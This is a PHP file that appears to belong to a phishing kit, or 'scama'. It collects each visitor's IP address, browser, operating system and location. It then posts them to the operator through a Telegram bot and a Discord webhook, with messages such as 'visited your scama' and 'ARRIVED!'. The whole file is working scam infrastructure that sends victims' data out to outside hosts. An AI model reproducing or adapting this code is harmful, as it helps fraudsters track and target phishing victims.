<?php
include 'admin/config.php';
$telegram = trim(file_get_contents("admin/config/status_telegram.ini"));
$discord = trim(file_get_contents("admin/config/status_discord.ini"));
$data = "✈️ {$_SESSION['ip']} visited your scama on $TheirTime | $TheirDate\n🌐 {$_SESSION['browser']} on {$_SESSION['os']} \n📍 From {$_SESSION['ip_countryName']} | {$_SESSION['ip_city']} | {$_SESSION['ip_state']}";
$txt = $data;
if ($telegram == "on"){
$send = ['chat_id' => $chatId, 'text' => $txt];
$web_telegram = "https://api.telegram.org/{$botUrl}";
$ch = curl_init($web_telegram . '/sendMessage');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);
}
if ($discord == "on"){
$webhookurl = $webhookUrl;
$json_data = array('content' => "$txt", 'username'=>"✈️ $ip ARRIVED!");
$make_json = json_encode($json_data);
$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $make_json);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec( $ch );
}


